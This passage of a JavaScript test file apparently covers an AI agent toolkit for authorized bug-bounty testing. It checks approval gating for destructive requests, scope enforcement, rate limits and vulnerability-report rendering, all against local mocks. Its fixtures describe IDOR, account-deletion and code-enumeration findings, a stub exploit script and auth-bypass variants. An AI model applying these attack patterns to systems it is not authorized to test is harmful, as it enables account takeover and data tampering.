  let hitCount = 0;
  const server = http.createServer((req, res) => { hitCount++; res.writeHead(201); res.end(); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const h = harness();
  const parent = h.exec("http3");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "mock 验证越权待审批准" }, parent);
  try {
    const result = await h.run("src_http", { url: `http://127.0.0.1:${port}/api/v1/orders`, method: "POST", headers: { authorization: "Bearer t" }, body: '{"userId":42}', justification: "越权改他人订单（待审）" }, parent);
    assert.equal(result.approval, "pending", "挂起待审");
    assert.equal(hitCount, 0, "挂起阶段 mock 不应收到请求");
    /* 用户点批准 → agent 调 src_resolve_approval allow：发出原请求，mock 收到一次。 */
    const approved = await h.run("src_resolve_approval", { id: result.pendingApprovalId, action: "allow", note: "可信测试账号" }, parent);
    assert.equal(approved.status, "approved");
    assert.equal(approved.responseStatus, 201, "发出后返回 mock 响应码");
    assert.equal(hitCount, 1, "批准后 mock 收到一次");
  } finally { server.close(); }
});
test("[local.26/31] src_http 无审批服务仍能挂起为 pending（异步队列不依赖 ctx.approval）", async () => {
  const server = http.createServer((_req, res) => { res.writeHead(200); res.end(); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const h = harness(); /* 无 approval 服务——异步队列不依赖它 */
  const parent = h.exec("http4");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "mock 验证无审批服务仍可挂起" }, parent);
  try {
    const result = await h.run("src_http", { url: `http://127.0.0.1:${port}/api-c/user/v1/closeAccount`, method: "GET", headers: { userId: "1", authorization: "Bearer t" }, justification: "删改" }, parent);
    assert.equal(result.approval, "pending", "无审批服务也挂起为 pending（不抛错）");
    assert.ok(/^approval-\d+$/.test(result.pendingApprovalId));
  } finally { server.close(); }
});
test("[local.26] src_http 目标越界（非授权 host）抛错", async () => {
  const h = harnessWithApproval({ policy: "allow" });
  const parent = h.exec("http5");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "mock 验证越界" }, parent);
  await assert.rejects(() => h.run("src_http", { url: "http://example.test/evil", method: "GET", justification: "越界" }, parent), /outside the authorized goal host/);
});

/* [local.31] 异步挂起队列：去重 + 投影 fold + resolve 幂等。 */
test("[local.31] src_http 同请求去重复用既有 pending（不堆队列）", async () => {
  const h = harness();
  const parent = h.exec("ap-dedup");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "去重验证" }, parent);
  const first = await h.run("src_http", { url: "http://127.0.0.1:59999/api-c/user/v1/closeAccount", method: "POST", headers: { authorization: "Bearer t", userId: "3" }, body: '{"x":1}', justification: "删改" }, parent);
  const second = await h.run("src_http", { url: "http://127.0.0.1:59999/api-c/user/v1/closeAccount", method: "POST", headers: { authorization: "Bearer t", userId: "3" }, body: '{"x":1}', justification: "重发同请求" }, parent);
  assert.equal(first.approval, "pending");
  assert.equal(second.approval, "pending");
  assert.equal(second.pendingApprovalId, first.pendingApprovalId, "去重复用同一 pending id，不新增队列项");
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.counts.pendingApprovals, 1, "去重后表里只有一条 pending");
});
test("[local.31] src_http 挂起发 src_record_pending_approval 合成事件→投影出现待审节点", async () => {
  const h = harness();
  const parent = h.exec("ap-fold");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "fold 验证" }, parent);
  const r = await h.run("src_http", { url: "http://127.0.0.1:59998/api-c/user/v1/closeAccount", method: "GET", headers: { userId: "7", authorization: "Bearer t" }, justification: "删改" }, parent);
  const events = h.sessions.get("ap-fold").events;
  const synth = events.find((e) => e.type === "tool/call" && e.data?.name === "src_record_pending_approval");
  assert.ok(synth !== void 0, "发了 src_record_pending_approval 合成事件");
  assert.equal(JSON.parse(synth.data.arguments).id, r.pendingApprovalId);
});
test("[local.31] src_resolve_approval 幂等：已 approved/rejected 不可重复审批", async () => {
  const server = http.createServer((_req, res) => { res.writeHead(204); res.end(); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const h = harness();
  const parent = h.exec("ap-idem");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "幂等验证" }, parent);
  try {
    const hung = await h.run("src_http", { url: `http://127.0.0.1:${port}/api-c/user/v1/closeAccount`, method: "POST", headers: { authorization: "Bearer t", userId: "2" }, body: '{"a":1}', justification: "删改" }, parent);
    await h.run("src_resolve_approval", { id: hung.pendingApprovalId, action: "allow" }, parent);
    /* 重复审批应报错。 */
    await assert.rejects(() => h.run("src_resolve_approval", { id: hung.pendingApprovalId, action: "reject" }, parent), /已 approved/);
  } finally { server.close(); }
});

/* [local.26] 模块二：打回闭环——src_reject_finding + 闸防二次提交。 */
test("[local.26] src_reject_finding 置 status=rejected + 备注；相似 title 二次提交被闸拒绝", async () => {
  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("rej1");
  await h.run("src_add_goal", { target: "example.test", objective: "打回闭环测试" }, parent);
  const st = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "删越权", detail: "d", goalId: st.goal.id }, parent);
  const fe = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "证据记录响应体含敏感信息", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId: intent.id, title: "账号删除漏洞", severity: "high", impact: "攻击者可删任意账号造成用户无法登录与服务中断", victimImpact: "用户被删账号无法登录且无法察觉删除来源", attackPrerequisites: "需登录态且可指定 userId 遍历枚举", concreteLossEvidence: [fe], affectedScope: "全量用户", remediation: "鉴权校验归属", pocEvidence: ["e"], reproducibleSteps: ["step1"] }, parent);
  /* 打回 */
  const rej = await h.run("src_reject_finding", { findingId: "finding-1", reason: "没看懂，能梳理下攻击链吗？" }, parent);
  assert.equal(rej.status, "rejected");
  assert.equal(rej.rejectReason, "没看懂，能梳理下攻击链吗？");
  const st2 = await h.run("src_state", {}, parent);
  assert.equal(st2.findings[0].status, "rejected");
  /* 相似 title 二次提交被闸拒绝 */
  await assert.rejects(() => h.run("src_add_finding", { intentId: intent.id, title: "账号删除漏洞", severity: "high", impact: "攻击者可删任意账号造成用户无法登录", victimImpact: "用户被删账号无法登录且无法察觉", attackPrerequisites: "需登录态且可指定 userId 遍历", concreteLossEvidence: [fe], affectedScope: "全量用户", remediation: "鉴权", pocEvidence: ["e"], reproducibleSteps: ["s"] }, parent), /已打回/);
  /* 报告含「已打回」节 + 打回备注 */
  const report = await h.run("src_report", {}, parent);
  assert.ok(report.markdown.includes("## 已打回"), "报告含已打回节");
  assert.ok(report.markdown.includes("没看懂，能梳理下攻击链吗？"), "报告含打回备注");
  /* [local.27] 回归：打回后主漏洞清单不再含该 finding 的标题行（用户 bug：报告里还有） */
  const findingsSection = report.markdown.split("## 漏洞发现")[1].split("## ")[0];
  assert.ok(!findingsSection.includes("### finding-1"), "打回后主漏洞清单不含已打回 finding");
  assert.ok(!findingsSection.includes("**漏洞名称**：账号删除漏洞"), "主漏洞清单不含已打回 finding 标题");
  assert.ok(findingsSection.includes("（无）"), "全部打回后主漏洞清单为空态");
});
test("[local.26] src_update_finding 补 attackChain；报告渲染攻击链叙事节", async () => {
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("chain1");
  await h.run("src_add_goal", { target: "example.test", objective: "攻击链测试" }, parent);
  const st = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "i1", detail: "d", goalId: st.goal.id }, parent);
  const fe = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "证据", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId: intent.id, title: "多跳越权", severity: "high", impact: "可改任意用户订单造成数据篡改", victimImpact: "用户订单被篡改且难以察觉", attackPrerequisites: "需登录态可遍历订单 id", concreteLossEvidence: [fe], affectedScope: "s", remediation: "r", pocEvidence: ["e"], reproducibleSteps: ["s1"], attackChain: "发现 /api/admin → 骗登录 → 改数据 → 用户损失 → 全量用户受影响", vulnType: "越权漏洞" }, parent);
  const report = await h.run("src_report", {}, parent);
  assert.ok(report.markdown.includes("**漏洞类型**：越权漏洞"), "vulnType 渲染");
  assert.ok(report.markdown.includes("发现 /api/admin → 骗登录"), "attackChain 叙事融入 section1");
  /* 无 attackChain 时由字段填充 */
  await h.run("src_add_finding", { intentId: intent.id, title: "单步漏洞", severity: "medium", impact: "可读取他人订单信息造成泄露", victimImpact: "用户订单信息泄露给攻击者", attackPrerequisites: "需登录态可枚举订单 id 遍历", concreteLossEvidence: [fe], affectedScope: "s", remediation: "r", pocEvidence: ["e"], reproducibleSteps: ["s"] }, parent);
  const report2 = await h.run("src_report", {}, parent);
  assert.ok(report2.markdown.includes("③ 利用过程：可读取他人订单信息造成泄露"), "无 attackChain 时③利用过程渲染");
  assert.ok(report2.markdown.includes("**漏洞类型**：未分类"), "无 vulnType 时走未分类占位");
});
test("[local.27] pocScript 以代码块渲染保留缩进；rawRequest 代码块保留缩进", async () => {
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("script1");
  await h.run("src_add_goal", { target: "example.test", objective: "脚本渲染测试" }, parent);
  const st = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "i1", detail: "d", goalId: st.goal.id }, parent);
  const fe = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "证据", confidence: 0.9 }, parent)).id;
  const script = "import requests\n\ndef attack(phone):\n    r = requests.get(f\"/api?p={phone}\")\n    if r.ok:\n        print(r.json())";
  await h.run("src_add_finding", { intentId: intent.id, title: "验证码枚举", severity: "high", impact: "可枚举验证码接管账号", victimImpact: "用户账号被接管且完全无感知，手机号与个人信息泄露，账号可被冒用充值或消费", attackPrerequisites: "攻击者仅需知道目标手机号，无需用户任何交互", concreteLossEvidence: [fe], affectedScope: "全量", remediation: "限频", pocEvidence: ["e"], reproducibleSteps: ["s1"], vulnType: "登录认证漏洞", pocScript: script, rawRequest: "GET /api/login?code=0001 HTTP/1.1\nHost: x.com\n    Authorization: Bearer t" }, parent);
  const report = await h.run("src_report", {}, parent);
  /* 一键脚本独立代码块 */
  assert.ok(report.markdown.includes("一键利用脚本："), "报告含一键脚本标题");
  assert.ok(report.markdown.includes("```\n" + script + "\n```"), "pocScript 以代码块渲染");
  assert.ok(report.markdown.includes("    r = requests.get"), "脚本缩进保留");
  /* rawRequest 代码块保留缩进 */
  assert.ok(report.markdown.includes("```\nGET /api/login"), "rawRequest 以代码块渲染");
  assert.ok(report.markdown.includes("    Authorization: Bearer t"), "rawRequest 缩进保留");
});

test("[local.30] 垂直攻击链①到⑤ + app 资产应用下载行 + 前端功能点（纯 mock）", async () => {
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("chain1");
  await h.run("src_add_goal", { target: "example.test", objective: "app 漏洞报告渲染测试" }, parent);
  const st = await h.run("src_state", {}, parent);
  /* 构造一个 app 资产，meta 里记下载方式 */
  const asset = await h.run("src_add_asset", { type: "app", value: "com.example.app", meta: "下载：https://app.example.test/download/v2.3.1 apk", source: "应用商店" }, parent);
  const intent = await h.run("src_add_intent", { title: "i1", detail: "d", goalId: st.goal.id }, parent);
  const fe = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "越权读取证据", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId: intent.id, title: "越权读取他人相册", severity: "high", impact: "遍历 userId 读取任意用户相册造成隐私泄露", victimImpact: "用户私密照片被陌生人查看与下载，隐私严重泄露且无感知", attackPrerequisites: "需登录（登录入口 https://app.example.test/login），普通账号即可遍历 userId", concreteLossEvidence: [fe], affectedScope: "全量用户", remediation: "后端校验 userId 归属", pocEvidence: ["GET /api/album?userId=2 -> 200"], reproducibleSteps: ["登录后 GET /api/album?userId=2"], vulnType: "越权漏洞", affectedAssetId: asset.id, discoveryPath: "抓包发现 /api/album 接口", entryPoint: "个人中心-相册页" }, parent);
  const report = await h.run("src_report", {}, parent);
  /* 垂直攻击链①到⑤ */
  assert.ok(report.markdown.includes("【攻击链】"), "攻击链标题");
  assert.ok(report.markdown.includes("① 发现：抓包发现 /api/album 接口"), "① 发现");
  assert.ok(report.markdown.includes("② 利用前提：需登录（登录入口 https://app.example.test/login）"), "② 利用前提含登录入口");
  assert.ok(report.markdown.includes("③ 利用过程：遍历 userId"), "③ 利用过程");
  assert.ok(report.markdown.includes("④ 实际损失："), "④ 实际损失");
  assert.ok(report.markdown.includes("⑤ 受害者影响：用户私密照片"), "⑤ 受害者影响");
  /* app 资产应用下载行（从 meta 提取 URL） */
  assert.ok(report.markdown.includes("应用下载：https://app.example.test/download/v2.3.1"), "app 资产应用下载行");
  /* 前端功能点 */
  assert.ok(report.markdown.includes("前端功能点：个人中心-相册页"), "前端功能点行");
  /* 各步骤从上到下顺序：① 在 ② 之前 */
  assert.ok(report.markdown.indexOf("① 发现") < report.markdown.indexOf("② 利用前提"), "① 在②之前");
  assert.ok(report.markdown.indexOf("② 利用前提") < report.markdown.indexOf("③ 利用过程"), "② 在③之前");
});

/* [local.32] 报告节完整性闸：UI reportOf（ReportView.tsx）的节标题集合必须与服务端 buildReport 逐字一致。
   双渲染漂移第三次显灵——把「每波手工同步」变成测试闸：任何一侧增/改/删节而另一侧没跟，这里红。 */
test("[local.32] 报告节完整性：UI reportOf 与服务端 buildReport 节标题集合一致（双渲染漂移闸）", async () => {
  const h = harness();
  const parent = h.exec("sec-gate");
  await h.run("src_add_goal", { target: "https://example.test", objective: "节完整性闸", authorization: "SRC" }, parent);
  const report = await h.run("src_report", {}, parent);
  const serverTitles = [...report.markdown.matchAll(/^## (.+)$/gm)].map((m) => m[1]).sort();
  assert.ok(serverTitles.length > 0, "服务端报告应包含 ## 节");
  const root = nodePath.resolve(nodePath.dirname(new URL(import.meta.url).pathname), "..");
  const tsx = await fsPromises.readFile(nodePath.join(root, "src/dsh-client-ui-src/src/client/ReportView.tsx"), "utf8");
  const usedKeys = [...new Set([...tsx.matchAll(/\bt\('(report\.sec\.[A-Za-z]+)'\)/g)].map((m) => m[1]))];
  assert.ok(usedKeys.length > 0, "ReportView.tsx 应使用 report.sec.* 节标题词条");
  const locales = await fsPromises.readFile(nodePath.join(root, "src/dsh-client-ui-src/src/client/locales.ts"), "utf8");
  const zhMap = {};
  /* zh 字典在文件前半，首个出现优先。 */
  for (const m of locales.matchAll(/'(report\.sec\.[A-Za-z]+)':\s*'([^']+)'/g)) if (zhMap[m[1]] === void 0) zhMap[m[1]] = m[2];
  const uiTitles = usedKeys.map((key) => zhMap[key]).sort();
  assert.deepEqual(uiTitles, serverTitles);
});

/* [local.32] src_http 软速率帽：同会话连续两次放行请求发送间隔 ≥250ms（≈≤4rps），且都成功（延迟而非拒绝）。 */
test("[local.32] src_http 软速率帽：连续放行请求发送间隔 ≥250ms 且不拒绝", async () => {
  const sendAt = [];
  const server = http.createServer((req, res) => { sendAt.push(Date.now()); res.writeHead(200, { "content-type": "text/plain" }); res.end("ok"); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const h = harness();
  const parent = h.exec("throttle");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "速率帽验证" }, parent);
  try {
    const first = await h.run("src_http", { url: `http://127.0.0.1:${port}/api/v1/users/list`, method: "GET", justification: "读名单无破坏性" }, parent);
    const t0 = Date.now();
    const second = await h.run("src_http", { url: `http://127.0.0.1:${port}/api/v1/orders/detail`, method: "GET", justification: "读详情无破坏性" }, parent);
    const elapsed = Date.now() - t0;
    assert.equal(first.approval, "allowed-auto");
    assert.equal(second.approval, "allowed-auto");
    assert.equal(first.status, 200);
    assert.equal(second.status, 200, "软限制不拒绝");
    assert.equal(sendAt.length, 2, "两次都真实发出");
    assert.ok(elapsed >= 225, `第二次调用应等待速率帽（实际 ${elapsed}ms）`);
    assert.ok(sendAt[1] - sendAt[0] >= 235, `两次发送间隔应 ≥250ms 左右（实际 ${sendAt[1] - sendAt[0]}ms）`);
  } finally { server.close(); }
});

/* [local.32] 基础设施默认沿用上次会话：新会话零覆盖项时 src_add_goal 自动复制最近配置过的其他会话设置；
   本会话显式保存过任何设置则完全尊重，不自动沿用。 */
test("[local.32] src_add_goal 默认沿用上次会话基础设施（显式设置不被覆盖）", async () => {
  const h = harness();
  const a = h.exec("sess-a");
  await h.run("src_add_goal", { target: "https://a.test", objective: "先配置基础设施" }, a);
  await h.run("src_set_infra", { key: "proxyUrl", value: "http://127.0.0.1:7890" }, a);
  await h.run("src_set_infra", { key: "burpMcpPort", value: "9876" }, a);
  /* 新会话 b：零覆盖项 → 建目标自动沿用。 */
  const b = h.exec("sess-b");
  const goalB = await h.run("src_add_goal", { target: "https://b.test", objective: "新会话免重填" }, b);
  assert.ok(goalB.infraInherited, "应返回 infraInherited");
  assert.match(goalB.infraInherited.summary, /proxyUrl=http:\/\/127\.0\.0\.1:7890/);
  assert.match(goalB.infraInherited.summary, /burpMcpPort=9876/);
  const infraB = await h.run("src_get_infra", {}, b);
  assert.equal(infraB.infra.proxyUrl, "http://127.0.0.1:7890");
  assert.equal(infraB.infra.burpMcpPort, "9876");
  /* 投影同步：每个沿用项都有合成 src_set_infra 事件。 */
  const events = h.sessions.get("sess-b").events.filter((e) => e.type === "tool/call" && e.data.name === "src_set_infra");
  assert.equal(events.length, 2, "沿用项应有合成事件同步投影");
  /* 会话 c：显式设置过自己的 proxyUrl → 完全不自动沿用。 */
  const c = h.exec("sess-c");
  await h.run("src_set_infra", { key: "proxyUrl", value: "http://127.0.0.1:9999" }, c);
  const goalC = await h.run("src_add_goal", { target: "https://c.test", objective: "已有显式设置" }, c);
  assert.equal(goalC.infraInherited, void 0, "显式设置过的会话不自动沿用");
  const infraC = await h.run("src_get_infra", {}, c);
  assert.equal(infraC.infra.proxyUrl, "http://127.0.0.1:9999");
});

/* [local.32] 401 语义修正：预检/扫描遇 401 是认证边界发现信号——不触发 requiresDecision、不停扫、不置 protectionSignal。 */
test("[local.32] scan_surface 遇 401 不算风控：继续扫完且 protectionSignal 不置真", async () => {
  const h = harness();
  const parent = h.exec("p401");
  await h.run("src_add_goal", { target: "https://example.test", objective: "认证边界扫描", authorization: "SRC" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response('{"error":"unauthorized"}', { status: 401, headers: { "content-type": "application/json" } });
    const result = await h.run("src_scan_surface", { baseUrl: "https://example.test", paths: ["/admin", "/api/users/list"], rps: 10 }, parent);
    assert.equal(result.requiresDecision, false, "401 预检不应触发 requiresDecision");
    assert.equal(result.stopped, void 0, "401 不应触发停扫");
    assert.equal(result.requested, 2, "全部路径都应扫到");
    for (const row of result.results) assert.equal(row.protectionSignal, false, "401 不应置 protectionSignal");
  } finally { globalThis.fetch = originalFetch; }
});

/* [local.33] 认证预算投影通道：src_test_bypass 发出认证请求后应发 src_auth_budget 合成事件（UI 头部「认证 used/limit」格数据源）。 */
test("[local.33] src_test_bypass 认证请求后发 src_auth_budget 合成事件", async () => {
  const h = harness();
  const parent = h.exec("g33bud");
  await h.run("src_add_goal", { target: "https://example.test", objective: "预算投影", authorization: "t" }, parent);
  const intent = await h.run("src_add_intent", { title: "auth", goalId: "goal-1" }, parent);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "authorization-bypass", hypothesis: "auth bypass", status: "hypothesis" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response("ok", { status: 200, headers: { "content-type": "application/json" } });
    const result = await h.run("src_test_bypass", {
      intentId: intent.id, researchId: research.id, category: "authorization-bypass", baseUrl: "https://example.test",
      baseline: { method: "GET", path: "/api/me", headers: { cookie: "sid=abc" } },
      variants: [{ method: "GET", path: "/api/admin", headers: { cookie: "sid=abc" } }]
    }, parent);
    assert.equal(result.requiresDecision, false);
    assert.equal(result.authBudgetExhausted, void 0, "2 次认证请求不应触顶");
    /* 合成事件携带权威计数（fold → 投影 → UI）。 */
    const events = h.sessions.get("g33bud").events.filter((e) => e.type === "tool/call" && e.data.name === "src_auth_budget");
    assert.equal(events.length, 1, "应恰好一条 src_auth_budget 事件");
    const payload = JSON.parse(events[0].data.arguments);
    assert.equal(payload.used, 2, "baseline + variant 各计一次");
    assert.equal(payload.limit, 30);
    /* 未发认证请求的调用不应发事件。 */
    await h.run("src_test_bypass", {
      intentId: intent.id, researchId: research.id, category: "method-bypass", baseUrl: "https://example.test",
      baseline: { method: "GET", path: "/api/me" }, variants: [{ method: "POST", path: "/api/me" }]
    }, parent);
    const eventsAfter = h.sessions.get("g33bud").events.filter((e) => e.type === "tool/call" && e.data.name === "src_auth_budget");
    assert.equal(eventsAfter.length, 1, "无认证请求不发事件");
  } finally { globalThis.fetch = originalFetch; }
});

/* [local.33] 域笔记快照投影通道：src_add_goal 开局推送 + src_record_domain_note 落库刷新 + 跨会话可见。 */
test("[local.33] src_add_goal / src_record_domain_note 推送域笔记快照事件（跨会话可见）", async () => {
  const h = harness();
  const a = h.exec("g33note-a");
  await h.run("src_add_goal", { target: "https://note.test", objective: "首轮", authorization: "t" }, a);
  let snaps = h.sessions.get("g33note-a").events.filter((e) => e.type === "tool/call" && e.data.name === "src_domain_notes_snapshot");
  assert.equal(snaps.length, 1, "开局应有一条快照");
  assert.deepEqual(JSON.parse(snaps[0].data.arguments).notes, [], "新目标开局快照为空");
  await h.run("src_record_domain_note", { category: "pitfall", title: "api/v1 限流", content: "burst 会 429" }, a);
  snaps = h.sessions.get("g33note-a").events.filter((e) => e.type === "tool/call" && e.data.name === "src_domain_notes_snapshot");
  assert.equal(snaps.length, 2, "落库后刷新快照");
  const notesA = JSON.parse(snaps[1].data.arguments).notes;
  assert.equal(notesA.length, 1);
  assert.equal(notesA[0].title, "api/v1 限流");
  assert.equal(notesA[0].content, "burst 会 429", "快照含 content 全文");
  assert.equal(notesA[0].category, "pitfall");
  /* 新会话同目标续测：开局快照带出历史域笔记（跨会话）。 */
  const b = h.exec("g33note-b");
  await h.run("src_add_goal", { target: "https://note.test", objective: "续测", authorization: "t" }, b);
  const snapsB = h.sessions.get("g33note-b").events.filter((e) => e.type === "tool/call" && e.data.name === "src_domain_notes_snapshot");
  assert.equal(snapsB.length, 1);
  const notesB = JSON.parse(snapsB[0].data.arguments).notes;
  assert.equal(notesB.length, 1, "历史域笔记应被带出");
  assert.equal(notesB[0].id, notesA[0].id, "同一条笔记（store 权威 id）");
  /* 快照事件可直接被 fold 消费成投影（UI 渲染数据面）。 */
  const { applySrcEvent, srcInitialState, viewSrcState } = await import("../lib/src.js");
  let st = JSON.parse(JSON.stringify(srcInitialState));
  st = applySrcEvent(st, { type: "tool/call", data: { name: "src_add_goal", arguments: JSON.stringify({ target: "note.test", objective: "续测" }) } });
  st = applySrcEvent(st, { type: "tool/call", data: { name: "src_domain_notes_snapshot", arguments: JSON.stringify({ notes: notesB }) } });
  const view = viewSrcState(st);
  assert.equal(view.domainNotes.length, 1);
  assert.equal(view.domainNotes[0].content, "burst 会 429");
});

/* [local.34] 工具输出 schema 一致性闸：零参视图工具的实际输出键必须 ⊆ output schema 声明属性。
   dsh 核心运行时按 additionalProperties:false 校验工具输出，undeclared 键直接报错——local.31 给
   store.view 加了 pendingApprovals 却没在 src_state output schema 声明，导致真实运行时每次
   src_state 都炸；测试 harness 直连 execute 不过 schema 校验所以全绿漏网。此闸防再犯。 */
test("[local.34] 工具输出 schema 一致性闸：零参工具输出键 ⊆ 声明属性（fresh + 含待审/笔记/待办的会话）", async () => {
  const h = harness();
  const fresh = h.exec("g34fresh");
  const full = h.exec("g34full");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "schema 闸", authorization: "本地自测" }, full);
  await h.run("src_add_intent", { title: "侦察", goalId: "goal-1" }, full);
  await h.run("src_user_todo", { title: "提供登录态", detail: "需要 cookie", kind: "auth-session" }, full);
  await h.run("src_record_domain_note", { category: "pitfall", title: "api/v1 限流", content: "burst 会 429" }, full);
  /* 高危请求 → 异步挂起（不发网络），store pending_approvals 表有行——复现用户实测报错的数据形态。 */
  let hitCount = 0;
  const server = http.createServer((req, res) => { hitCount++; res.writeHead(204); res.end(); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  try {
    const pending = await h.run("src_http", { url: `http://127.0.0.1:${server.address().port}/api/v1/user/7/settings`, method: "POST", headers: { authorization: "Bearer t" }, body: '{"userId":7}', justification: "schema 闸待审样本" }, full);
    assert.equal(pending.approval, "pending", "高危请求应挂起");
    assert.equal(hitCount, 0, "挂起不发网络");
  } finally { server.close(); }
  const conform = (name, out) => {
    const schema = h.tools.get(name)?.output?.schema;
    assert.ok(schema, `${name} 应有 output schema`);
    if (schema.additionalProperties === false && schema.properties !== void 0) {
      const declared = new Set(Object.keys(schema.properties));
      for (const key of Object.keys(out)) assert.ok(declared.has(key), `${name} 输出键「${key}」未在 output schema 声明（运行时 additionalProperties:false 会炸）`);
    }
    for (const [key, prop] of Object.entries(schema.properties ?? {})) {
      if (prop && prop.required === true) assert.ok(key in out, `${name} 缺 required 键「${key}」`);
    }
  };
  for (const sess of [fresh, full]) {
    for (const name of ["src_state", "src_graph", "src_report", "src_get_infra", "src_list_domain_notes"]) {
      let out;
      try { out = await h.run(name, {}, sess); } catch { continue; }
      if (out === void 0 || out === null) continue;
      conform(name, out);
    }
  }
  const st = await h.run("src_state", {}, full);
  assert.ok(Array.isArray(st.pendingApprovals) && st.pendingApprovals.length >= 1, "src_state 应输出 pendingApprovals（回归点）");
  assert.equal(st.pendingApprovals[0].status, "pending");
});

/* [local.35] 域笔记沉淀闸（软警告）：本会话踩过防护/限流信号或已否假设但零域笔记新增 → finalize 警告；记过则无。
   401 是认证边界发现信号（local.32 语义），不算沉淀信号。 */
test("[local.35] finalize 域笔记沉淀闸：有目标特有信号零笔记 → 警告；记过/无信号 → 无警告", async () => {
  const h = harness();
  const parent = h.exec("g35note");
  await h.run("src_add_goal", { target: "https://example.test", objective: "域笔记闸", authorization: "t" }, parent);
  const intent = await h.run("src_add_intent", { title: "侦察", goalId: "goal-1" }, parent);
  const BLIND = [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }];
  /* 场景①：本会话有 protectionSignal observation + false-positive research，零域笔记 → 警告 */
  await h.run("src_record_observation", { intentId: intent.id, method: "GET", path: "/admin", httpStatus: 403, protectionSignal: true, source: "scan", decision: "WAF 拦截" }, parent);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "waf-bypass", hypothesis: "分块绕过", status: "false-positive", stopReason: "分块不被支持" }, parent);
  assert.equal(research.updated, false);
  const warned = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: BLIND, allowIncomplete: true, allowIncompleteReason: "测试停止" }, parent);
  const warnText = warned.warnings.join(" ");
  assert.match(warnText, /未沉淀任何域笔记/, "有信号零笔记应警告");
  assert.match(warnText, /1 个防护\/限流信号、1 条已否\/受阻假设/);
  /* 场景②：同会话记一条域笔记后警告消失 */
  await h.run("src_record_domain_note", { category: "pitfall", title: "admin 全域 WAF", content: "403 challenge 页" }, parent);
  const clean = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: BLIND, allowIncomplete: true, allowIncompleteReason: "测试停止" }, parent);
  assert.doesNotMatch(clean.warnings.join(" "), /未沉淀任何域笔记/, "记过笔记后不应再警告");
  /* 场景③：401 observation 是认证边界信号不算沉淀信号（无信号+零笔记 → 无域笔记警告） */
  const h2 = harness();
  const p2 = h2.exec("g35auth401");
  await h2.run("src_add_goal", { target: "https://auth.example.test", objective: "401 语义", authorization: "t" }, p2);
  const it2 = await h2.run("src_add_intent", { title: "认证面", goalId: "goal-1" }, p2);
  await h2.run("src_record_observation", { intentId: it2.id, method: "GET", path: "/api/me", httpStatus: 401, protectionSignal: false, source: "scan", decision: "认证边界" }, p2);
  const fin2 = await h2.run("src_finalize_engagement", { remainingDirections: [], blindSpots: BLIND, allowIncomplete: true, allowIncompleteReason: "测试停止" }, p2);
  assert.doesNotMatch(fin2.warnings.join(" "), /未沉淀任何域笔记/, "仅 401 不触发域笔记警告（认证语义保留）");
  /* 场景④：别的会话在同一目标记过笔记、本会话零新增 → 仍警告（sourceSessionId 区分） */
  const other = h.exec("g35other");
  await h.run("src_add_goal", { target: "https://example.test", objective: "别会话记的", authorization: "t" }, other);
  await h.run("src_record_domain_note", { category: "fingerprint", title: "别会话的笔记", content: "不应抵消本会话义务" }, other);
  const fin3 = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: BLIND, allowIncomplete: true, allowIncompleteReason: "测试停止" }, parent);
  assert.match(fin3.warnings.join(" "), /未沉淀任何域笔记/, "其他会话的笔记不能抵消本会话的沉淀义务");
});
